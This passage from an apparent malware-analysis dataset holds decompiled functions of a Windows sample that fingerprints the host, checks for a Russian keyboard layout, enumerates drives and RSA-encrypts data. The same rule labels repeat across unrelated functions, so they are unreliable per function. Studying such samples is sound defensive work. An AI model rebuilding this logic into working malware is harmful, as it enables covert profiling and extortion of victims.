} while (uVar11 < uVar7);\n        }\n        uVar6 = (*pcVar2)(0x40);\n        uVar12 = 0x40;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0xfde9, 0, 0x40, 0xffffffff, 0x40, uVar6);\n        iVar5 = 0;\n        iVar4 = fcn.00405370(1);\n        pcVar9 = _sym.imp.KERNEL32.dll_VirtualFree;\n        if (iVar4 == 0) {\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(uVar12, 0, 0x8000);\n            (*pcVar9)(uVar12, 0, 0x8000);\n            (*pcVar9)(uStack820, 0, 0x8000);\n            uVar6 = 0;\n            goto code_r0x00405c1f;\n        }\n        if (iVar5 != 0) {\n            *arg_10h = iVar5;\n        }\n        pcVar9 = _sym.imp.KERNEL32.dll_VirtualFree;\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(uVar12, 0, 0x8000);\n        (*pcVar9)(uVar12, 0, 0x8000);\n        (*pcVar9)(uStack820, 0, 0x8000);\n    }\n    uVar6 = 1;\ncode_r0x00405c1f:\n    uStack580 = 0x8000;\n    (*pcVar9)();\n    fcn.00407720();\n    return uVar6;\n}\n",
        "token_count": 2948
    },
    "00405ea0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405ea0(uint *arg_8h, uint *arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    uint *in_ECX;\n    uint var_4h;\n    \n    if (arg_8h != NULL) {\n        *arg_8h = *in_ECX;\n    }\n    if (arg_10h != NULL) {\n        *arg_10h = in_ECX[1];\n    }\n    if (arg_ch != NULL) {\n        *arg_ch = in_ECX[2];\n    }\n    if (arg_14h != NULL) {\n        *arg_14h = in_ECX[3];\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "00406000": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406000(uint pbData, uint dwDataLen, uint arg_10h, uint *arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint pdwDataLen;\n    int32_t var_ch;\n    uint hKey;\n    uint phProv;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x412ae8);\n    phProv = 0;\n    hKey = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextW)\n                      (&phProv, 0, L\"Microsoft Enhanced Cryptographic Provider v1.0\", 1, 0);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar1 != -0x7ff6ffea) {\n            return 0;\n        }\n        iVar1 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextW)\n                          (&phProv, 0, L\"Microsoft Enhanced Cryptographic Provider v1.0\", 1, 8);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    var_ch = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_CryptImportKey)(phProv, pbData, dwDataLen, 0, 0, &hKey);\n    if (iVar1 != 0) {\n        pdwDataLen = 10;\n        (*_sym.imp.ADVAPI32.dll_CryptGetKeyParam)(hKey, 8, &var_18h, &pdwDataLen, 0);\n        *arg_14h = 200;\n        var_ch = (*_sym.imp.ADVAPI32.dll_CryptEncrypt)(hKey, 0, 1, 0, arg_10h, arg_14h, arg_18h);\n        var_14h = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (var_ch == 0) {\n            fcn.004034f0();\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CryptReleaseContext)(phProv, 0);\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x412ae8);\n    return var_ch;\n}\n",
        "token_count": 526
    },
    "00406300": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00406300(int32_t param_1)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    int32_t iVar3;\n    int16_t *piVar4;\n    int16_t *piVar5;\n    \n    if (*0x412b00 == NULL) {\n        return 1;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n    piVar5 = param_1 + -2 + iVar3 * 2;\n    if (iVar3 != 0) {\n        do {\n            if (*piVar5 == 0x2e) break;\n            piVar5 = piVar5 + -1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n        if (iVar3 != 0) {\n            piVar4 = *0x412b00;\n            if (*piVar5 == 0) {\ncode_r0x00406394:\n                if (piVar4 != NULL) {\n                    return 1;\n                }\n            }\n            else {\n                iVar1 = **0x412b00;\n                if (iVar1 != 0) {\n                    iVar3 = *0x412b00 - piVar5;\n                    piVar2 = piVar5;\njoined_r0x00406358:\n                    do {\n                        if (iVar1 != 0) {\n                            if (*piVar2 == 0) goto code_r0x00406394;\n                            if (*(iVar3 + piVar2) == *piVar2) {\n                                iVar1 = *(iVar3 + piVar2 + 1);\n                                piVar2 = piVar2 + 1;\n                                goto joined_r0x00406358;\n                            }\n                        }\n                        if (*piVar2 == 0) goto code_r0x00406394;\n                        iVar1 = piVar4[1];\n                        piVar4 = piVar4 + 1;\n                        iVar3 = iVar3 + 2;\n                        piVar2 = piVar5;\n                    } while (iVar1 != 0);\n                }\n            }\n            return 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 472
    },
    "004069a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004069a0(int32_t lpAddress)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_lstrcatW;\n    if (in_ECX[0x20] != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrcatW)(lpAddress, in_ECX[0x22]);\n        (*pcVar1)(lpAddress, 0x4103f0);\n        (*pcVar1)(lpAddress, in_ECX[0x21]);\n        (*pcVar1)(lpAddress, 0x4103f4);\n    }\n    if (*in_ECX != 0) {\n        (*pcVar1)(lpAddress, in_ECX[1]);\n        (*pcVar1)(lpAddress, 0x4103f0);\n        (*pcVar1)(lpAddress, in_ECX[2]);\n        (*pcVar1)(lpAddress, 0x4103f4);\n    }\n    if (in_ECX[3] != 0) {\n        (*pcVar1)(lpAddress, in_ECX[4]);\n        (*pcVar1)(lpAddress, 0x4103f0);\n        (*pcVar1)(lpAddress, in_ECX[5]);\n        (*pcVar1)(lpAddress, 0x4103f4);\n    }\n    if (in_ECX[6] != 0) {\n        (*pcVar1)(lpAddress, in_ECX[7]);\n        (*pcVar1)(lpAddress, 0x4103f0);\n        (*pcVar1)(lpAddress, in_ECX[8]);\n        (*pcVar1)(lpAddress, 0x4103f4);\n    }\n    if (in_ECX[9] != 0) {\n        (*pcVar1)(lpAddress, in_ECX[10]);\n        (*pcVar1)(lpAddress, 0x4103f0);\n        (*pcVar1)(lpAddress, in_ECX[0xb]);\n        (*pcVar1)(lpAddress, 0x4103f4);\n    }\n    if (in_ECX[0xc] != 0) {\n        (*pcVar1)(lpAddress, in_ECX[0xd]);\n        (*pcVar1)(lpAddress, 0x4103f0);\n        (*pcVar1)(lpAddress, in_ECX[0xe]);\n        (*pcVar1)(lpAddress, 0x4103f4);\n    }\n    if (in_ECX[0xf] != 0) {\n        (*pcVar1)(lpAddress, in_ECX[0x10]);\n        (*pcVar1)(lpAddress, 0x4103f0);\n        (*pcVar1)(lpAddress, in_ECX[0x11]);\n        (*pcVar1)(lpAddress, 0x4103f4);\n    }\n    if (in_ECX[0x12] != 0) {\n        (*pcVar1)(lpAddress, in_ECX[0x13]);\n        (*pcVar1)(lpAddress, 0x4103f0);\n        (*pcVar1)(lpAddress, in_ECX[0x14]);\n        (*pcVar1)(lpAddress, 0x4103f4);\n    }\n    if (in_ECX[0x15] != 0) {\n        (*pcVar1)(lpAddress, in_ECX[0x16]);\n        (*pcVar1)(lpAddress, 0x4103f0);\n        (*pcVar1)(lpAddress, in_ECX[0x17]);\n        (*pcVar1)(lpAddress, 0x4103f4);\n    }\n    if (in_ECX[0x18] != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x42, 0x3000, 0x40);\n        if (in_ECX[0x1b] == 0) {\n            (*_sym.imp.USER32.dll_wsprintfW)(uVar2, L\"undefined\");\n        }\n        else {\n            (*_sym.imp.USER32.dll_wsprintfW)(uVar2, 0x4103f8, in_ECX[0x1b], in_ECX[0x1c]);\n        }\n        (*pcVar1)(lpAddress, in_ECX[0x19]);\n        (*pcVar1)(lpAddress, 0x4103f0);\n        (*pcVar1)(lpAddress, uVar2);\n        (*pcVar1)(lpAddress, 0x4103f4);\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(uVar2, 0, 0x8000);\n    }\n    if (in_ECX[0x1d] != 0) {\n        (*pcVar1)(lpAddress, in_ECX[0x1e]);\n        (*pcVar1)(lpAddress, 0x4103f0);\n        (*pcVar1)(lpAddress, in_ECX[0x1f]);\n        (*pcVar1)(lpAddress, 0x4103f4);\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpAddress);\n    *(lpAddress + -2 + iVar3 * 2) = 0;\n    return lpAddress;\n}\n",
        "token_count": 1180
    },
    "00406ba0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00406ba0(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if (*param_1 != 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1[2]);\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1[1]);\n        iVar3 = iVar1 + 4 + iVar3;\n    }\n    if (param_1[3] != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1[5]);\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1[4]);\n        iVar3 = iVar1 + 4 + iVar2 + iVar3;\n    }\n    if (param_1[6] != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1[8]);\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1[7]);\n        iVar3 = iVar1 + 4 + iVar2 + iVar3;\n    }\n    if (param_1[9] != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1[0xb]);\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1[10]);\n        iVar3 = iVar1 + 4 + iVar2 + iVar3;\n    }\n    if (param_1[0xc] != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1[0xe]);\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1[0xd]);\n        iVar3 = iVar1 + 4 + iVar2 + iVar3;\n    }\n    if (param_1[0xf] != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1[0x11]);\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1[0x10]);\n        iVar3 = iVar1 + 4 + iVar2 + iVar3;\n    }\n    if (param_1[0x12] != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1[0x14]);\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1[0x13]);\n        iVar3 = iVar1 + 4 + iVar2 + iVar3;\n    }\n    if (param_1[0x15] != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1[0x17]);\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1[0x16]);\n        iVar3 = iVar1 + 4 + iVar2 + iVar3;\n    }\n    if (param_1[0x18] != 0) {\n        iVar3 = iVar3 + 0x14;\n    }\n    if (param_1[0x1d] != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1[0x1f]);\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1[0x1e]);\n        iVar3 = iVar1 + 4 + iVar2 + iVar3;\n    }\n    if (param_1[0x20] != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1[0x22]);\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1[0x21]);\n        return iVar2 + 4 + iVar3 + iVar1;\n    }\n    return iVar3;\n}\n",
        "token_count": 875
    },
    "00406d90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_80h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00406d90(int32_t *param_1)\n\n{\n    code *pcVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint extraout_ECX;\n    code *pcVar8;\n    code *pcVar9;\n    ulong uVar10;\n    int16_t *piVar11;\n    char16_t *pcVar12;\n    uint var_80h;\n    uint lpSystemInfo;\n    char16_t *var_40h;\n    char16_t *var_3ch;\n    char16_t *var_38h;\n    char16_t *var_34h;\n    char16_t *var_30h;\n    char16_t *var_2ch;\n    char16_t *var_28h;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    code *lpSectorsPerCluster;\n    uint32_t lpString1;\n    int32_t lpBytesPerSector;\n    int32_t *lpTotalNumberOfClusters;\n    int32_t lpNumberOfFreeClusters;\n    uint32_t var_8h;\n    int32_t lpString;\n    \n    pcVar9 = _sym.imp.KERNEL32.dll_VirtualAlloc;\n    if (*param_1 != 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x202, 0x3000, 4);\n        param_1[2] = iVar3;\n        lpString1 = 0x100;\n        (*_sym.imp.ADVAPI32.dll_GetUserNameW)(iVar3, &lpString1);\n    }\n    if (param_1[3] != 0) {\n        lpString1 = 0x1e;\n        iVar3 = (*pcVar9)(0, 0x20, 0x3000, 4);\n        param_1[5] = iVar3;\n        (*_sym.imp.KERNEL32.dll_GetComputerNameW)(iVar3, &lpString1);\n    }\n    pcVar1 = _sym.imp.USER32.dll_wsprintfW;\n    if (param_1[6] != 0) {\n        iVar3 = (*pcVar9)(0, 0x80, 0x3000, 4);\n        param_1[8] = iVar3;\n        if (iVar3 != 0) {\n            iVar3 = fcn.00406d10(0x80000002, L\"SYSTEM\\\\CurrentControlSet\\\\services\\\\Tcpip\\\\Parameters\", L\"Domain\", iVar3\n                                 , 0x80);\n            if (iVar3 == 0) {\n                pcVar12 = L\"undefined\";\n                piVar11 = param_1[8];\n            }\n            else {\n                piVar11 = param_1[8];\n                if (*piVar11 != 0) goto code_r0x00406e56;\n                pcVar12 = L\"WORKGROUP\";\n            }\n            (*pcVar1)(piVar11, pcVar12);\n        }\n    }\ncode_r0x00406e56:\n    if (param_1[0xc] != 0) {\n        lpBytesPerSector = (*pcVar9)(0, 0x80, 0x3000, 4);\n        param_1[0xe] = lpBytesPerSector;\n        var_8h = 0;\n        iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)\n                          (0x80000001, L\"Control Panel\\\\International\", 0, 0x20019, &lpNumberOfFreeClusters);\n        if (iVar3 == 0) {\n            lpString1 = 0x40;\n            iVar3 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)\n                              (lpNumberOfFreeClusters, L\"LocaleName\", 0, 0, lpBytesPerSector, &lpString1);\n            if (iVar3 == 0) {\n                var_8h = 1;\n            }\n            else {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(lpNumberOfFreeClusters);\n            if (var_8h != 0) goto code_r0x00406ef5;\n        }\n        param_1[0xc] = 0;\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(param_1[0xe], 0, 0x8000);\n    }\ncode_r0x00406ef5:\n    if (param_1[0xf] != 0) {\n        lpNumberOfFreeClusters = (*pcVar9)(0, 0x8a, 0x3000, 4);\n        lpString1 = lpNumberOfFreeClusters + 0xe;\n        iVar3 = (*pcVar9)(0, 4, 0x3000, 4);\n        param_1[0x11] = iVar3;\n        iVar3 = 1;\n        lpString = 1;\n        var_8h = 0;\n        do {\n            (*pcVar1)(lpNumberOfFreeClusters, 0x4104f4, iVar3);\n            lpBytesPerSector = 0;\n            iVar3 = iVar3 + 1;\n            iVar4 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)\n                              (0x80000001, L\"Keyboard Layout\\\\Preload\", 0, 0x20019, &lpTotalNumberOfClusters);\n            if (iVar4 == 0) {\n                lpSectorsPerCluster = 0x80;\n                iVar4 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)\n                                  (lpTotalNumberOfClusters, lpNumberOfFreeClusters, 0, 0, lpString1, \n                                   &lpSectorsPerCluster);\n                if (iVar4 == 0) {\n                    lpBytesPerSector = 1;\n                }\n                else {\n                    (*_sym.imp.KERNEL32.dll_GetLastError)();\n                }\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(lpTotalNumberOfClusters);\n                if (lpBytesPerSector == 0) goto code_r0x00406fe3;\n                iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)(lpString1, L\"00000419\");\n                if (iVar4 == 0) {\n                    (*pcVar1)(param_1[0x11], 0x410540);\n                    var_8h = 1;\n                    lpString = 0;\n                }\n            }\n            else {\ncode_r0x00406fe3:\n                lpString = 0;\n            }\n        } while ((iVar3 != 9) && (lpString != 0));\n        if (var_8h == 0) {\n            (*pcVar1)(param_1[0x11], 0x410544);\n        }\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(lpNumberOfFreeClusters, 0, 0x8000);\n        pcVar9 = _sym.imp.KERNEL32.dll_VirtualAlloc;\n    }\n    if (param_1[0x12] != 0) {\n        lpTotalNumberOfClusters = (*pcVar9)(0, 0x82, 0x3000, 4);\n        param_1[0x14] = lpTotalNumberOfClusters;\n        lpBytesPerSector = 0;\n        iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)\n                          (0x80000002, L\"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\", 0, 0x20019, &lpString1);\n        if (iVar3 == 0) {\n            lpSectorsPerCluster = 0x80;\n            iVar3 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)\n                              (lpString1, 0x410548, 0, 0, lpTotalNumberOfClusters, &lpSectorsPerCluster);\n            if (iVar3 == 0) {\n                lpBytesPerSector = 1;\n            }\n            else {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(lpString1);\n            if (lpBytesPerSector != 0) goto code_r0x004070d6;\n        }\n        fcn.00406d10(0x80000002, L\"SOFTWARE\\\\Wow6432Node\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\", 0x410548, \n                     param_1[0x14], 0x80);\n        (*pcVar1)(param_1[0x14], L\"error\");\n    }\ncode_r0x004070d6:\n    if (param_1[0x15] == 0) goto code_r0x00407134;\n    (*_sym.imp.KERNEL32.dll_GetNativeSystemInfo)(&lpSystemInfo);\n    iVar3 = (*pcVar9)(0, 0x40, 0x3000, 4);\n    param_1[0x17] = iVar3;\n    if (lpSystemInfo < 10) {\n    // switch table (10 cases) at 0x4074fc\n        switch(*(*(lpSystemInfo + 0x407510) * 4 + 0x4074fc)) {\n        case 0x40710d:\n            pcVar12 = 0x410640;\n            break;\n        case 0x407114:\n            pcVar12 = 0x410648;\n            break;\n        case 0x40711b:\n            pcVar12 = L\"Itanium\";\n            break;\n        case 0x407122:\n            pcVar12 = 0x410660;\n            break;\n        case 0x407129:\n            goto code_r0x00407129;\n        }\n    }\n    else {\ncode_r0x00407129:\n        pcVar12 = L\"Unknown\";\n    }\n    (*pcVar1)(iVar3, pcVar12);\ncode_r0x00407134:\n    if (param_1[9] != 0) {\n        lpSectorsPerCluster = NULL;\n        iVar3 = fcn.00407520(param_1 + 0xb, &lpSectorsPerCluster);\n        if (iVar3 == 0) {\n            param_1[9] = 0;\n        }\n    }\n    pcVar8 = _sym.imp.KERNEL32.dll_lstrcatW;\n    if (param_1[0x18] != 0) {\n        iVar3 = (*pcVar9)(0, 0x400, 0x3000, 4);\n        param_1[0x1a] = iVar3;\n        lpNumberOfFreeClusters = (*pcVar9)(0, 0xe0c, 0x3000, 4);\n        lpString = lpNumberOfFreeClusters + 0x60c;\n        (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryW)(lpNumberOfFreeClusters, 0x100);\n        *(lpNumberOfFreeClusters + 6) = 0;\n        lpTotalNumberOfClusters = lpNumberOfFreeClusters + 0x600;\n        (*_sym.imp.KERNEL32.dll_GetVolumeInformationW)\n                  (lpNumberOfFreeClusters, lpNumberOfFreeClusters + 0x200, 0x100, lpTotalNumberOfClusters, \n                   lpNumberOfFreeClusters + 0x608, lpNumberOfFreeClusters + 0x604, lpNumberOfFreeClusters + 0x400, 0x100\n                  );\n        lpBytesPerSector = 0;\n        iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)\n                          (0x80000002, L\"HARDWARE\\\\DESCRIPTION\\\\System\\\\CentralProcessor\\\\0\", 0, 0x20019, &lpString1);\n        if (iVar3 == 0) {\n            lpSectorsPerCluster = 0x80;\n            iVar3 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)\n                              (lpString1, L\"ProcessorNameString\", 0, 0, lpString, &lpSectorsPerCluster);\n            if (iVar3 == 0) {\n                lpBytesPerSector = 1;\n            }\n            else {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(lpString1);\n            if (lpBytesPerSector != 0) {\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString);\n                fcn.00406d10(0x80000002, L\"HARDWARE\\\\DESCRIPTION\\\\System\\\\CentralProcessor\\\\0\", L\"Identifier\", \n                             lpString + iVar3 * 2, 0x80);\n            }\n        }\n        (*pcVar1)(param_1[0x1a], 0x4104f4, *lpTotalNumberOfClusters);\n        pcVar8 = _sym.imp.KERNEL32.dll_lstrcatW;\n        (*_sym.imp.KERNEL32.dll_lstrcatW)(param_1[0x1a], lpString);\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(L\"ntdll.dll\", \"RtlComputeCrc32\");\n        lpSectorsPerCluster = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar5);\n        if (lpSectorsPerCluster == NULL) {\n            param_1[0x1b] = 0;\n        }\n        else {\n            iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1[0x1a]);\n            iVar3 = (*lpSectorsPerCluster)(0x29a, param_1[0x1a], iVar3 * 2);\n            param_1[0x1b] = iVar3;\n        }\n        param_1[0x1c] = *lpTotalNumberOfClusters;\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(lpNumberOfFreeClusters, 0, 0x8000);\n    }\n    if (param_1[0x1d] != 0) {\n        var_40h = L\"UNKNOWN\";\n        var_3ch = L\"NO_ROOT_DIR\";\n        var_38h = L\"REMOVABLE\";\n        var_34h = L\"FIXED\";\n        var_30h = L\"REMOTE\";\n        var_2ch = L\"CDROM\";\n        var_28h = L\"RAMDISK\";\n        iVar3 = (*pcVar9)(0, 0x400, 0x3000, 4);\n        param_1[0x1f] = iVar3;\n        puVar7 = &var_80h;\n        uVar2 = 0x41;\n        do {\n            *puVar7 = uVar2;\n            puVar7 = puVar7 + 2;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < 0x5b);\n        var_24h = *0x40e304;\n        var_20h = *0x40e308;\n        lpString1 = 0;\n        do {\n            var_24h = var_24h & 0xffff0000 | *(&var_80h + lpString1 * 2);\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetDriveTypeW)(&var_24h);\n            pcVar9 = _sym.imp.KERNEL32.dll_lstrlenW;\n            if ((2 < uVar6) && (uVar6 != 5)) {\n                var_20h = var_20h & 0xffff0000;\n                (*pcVar8)(param_1[0x1f], &var_24h);\n                var_20h = CONCAT22(var_20h._2_2_, 0x5c);\n                (*pcVar8)(param_1[0x1f], (&var_40h)[uVar6]);\n                (*pcVar8)(param_1[0x1f], 0x4107b0);\n                iVar3 = (*_sym.imp.KERNEL32.dll_GetDiskFreeSpaceW)\n                                  (&var_24h, &lpSectorsPerCluster, &lpBytesPerSector, &lpNumberOfFreeClusters, \n                                   &lpTotalNumberOfClusters);\n                if (iVar3 == 0) {\n                    (*pcVar8)(param_1[0x1f], 0x4107d4);\n                    pcVar9 = _sym.imp.KERNEL32.dll_lstrlenW;\n                }\n                else {\n                    iVar3 = lpSectorsPerCluster * lpBytesPerSector;\n                    uVar10 = fcn.00408470(lpTotalNumberOfClusters, 0, iVar3, 0);\n                    iVar4 = uVar10 >> 0x20;\n                    var_8h = uVar10;\n                    uVar10 = fcn.00408470(lpNumberOfFreeClusters, 0, iVar3, 0);\n                    uVar6 = var_8h;\n                    lpString = var_8h - uVar10;\n                    var_8h = (iVar4 - (uVar10 >> 0x20)) - (var_8h < uVar10);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1[0x1f]);\n                    pcVar1 = _sym.imp.USER32.dll_wsprintfW;\n                    (*_sym.imp.USER32.dll_wsprintfW)(param_1[0x1f] + iVar3 * 2, 0x4107b4, uVar6, iVar4);\n                    pcVar9 = _sym.imp.KERNEL32.dll_lstrlenW;\n                    iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1[0x1f]);\n                    (*pcVar1)(param_1[0x1f] + iVar3 * 2, L\"%I64u\", lpString, var_8h);\n                    pcVar8 = _sym.imp.KERNEL32.dll_lstrcatW;\n                    (*_sym.imp.KERNEL32.dll_lstrcatW)(param_1[0x1f], 0x4107d0);\n                }\n            }\n            lpString1 = lpString1 + 1;\n        } while (lpString1 < 0x1b);\n        iVar3 = (*pcVar9)(param_1[0x1f]);\n        *(param_1[0x1f] + -2 + iVar3 * 2) = 0;\n    }\n    if (param_1[0x20] != 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x81, 0x3000, 4);\n        param_1[0x21] = iVar3;\n        if (iVar3 != 0) {\n            uVar5 = extraout_ECX;\n            iVar4 = fcn.004068f0(iVar3);\n            if (iVar4 != 0) {\n                return 1;\n            }\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(param_1[0x21], 0, 0x8000, iVar3, uVar5);\n        }\n        param_1[0x20] = 0;\n    }\n    return 1;\n}\n",
        "token_count": 4243
    },
    "00407720": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407720(int32_t *param_1)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_VirtualFree;\n    if (*param_1 != 0) {\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(param_1[2], 0, 0x8000);\n    }\n    if (param_1[3] != 0) {\n        (*pcVar1)(param_1[5], 0, 0x8000);\n    }\n    if (param_1[6] != 0) {\n        (*pcVar1)(param_1[8], 0, 0x8000);\n    }\n    if (param_1[0xc] != 0) {\n        (*pcVar1)(param_1[0xe], 0, 0x8000);\n    }\n    if (param_1[0xf] != 0) {\n        (*pcVar1)(param_1[0x11], 0, 0x8000);\n    }\n    if (param_1[0x12] != 0) {\n        (*pcVar1)(param_1[0x14], 0, 0x8000);\n    }\n    if (param_1[0x15] != 0) {\n        (*pcVar1)(param_1[0x17], 0, 0x8000);\n    }\n    if (param_1[9] != 0) {\n        (*pcVar1)(param_1[0xb], 0, 0x8000);\n    }\n    if (param_1[0x18] != 0) {\n        (*pcVar1)(param_1[0x1a], 0, 0x8000);\n    }\n    if (param_1[0x20] != 0) {\n        (*pcVar1)(param_1[0x21], 0, 0x8000);\n    }\n    return;\n}\n",
        "token_count": 444
    },
    "00407ba0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
